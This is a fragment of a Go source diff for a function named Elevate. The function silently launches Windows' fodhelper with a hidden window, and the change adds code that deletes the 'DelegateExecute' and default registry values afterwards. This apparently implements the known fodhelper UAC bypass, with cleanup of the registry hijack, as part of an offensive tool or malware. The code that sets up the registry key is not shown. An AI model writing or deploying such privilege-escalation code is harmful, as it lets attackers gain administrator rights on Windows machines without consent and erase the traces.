@@ -61,9 +61,22 @@ func Elevate() error {
 
 	cmd := exec.Command("cmd.exe", "/C", "fodhelper")
 	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
-	
 	err = cmd.Run()
-	return err
+	if err != nil {
+		return err
+	}
+
+	err = k.DeleteValue("")
+	if err != nil {
+		return err
+	}
+
+	err = k.DeleteValue("DelegateExecute")
+	if err != nil {
+		return err
+	}
+
+	return nil
 }
 
 func Run() {
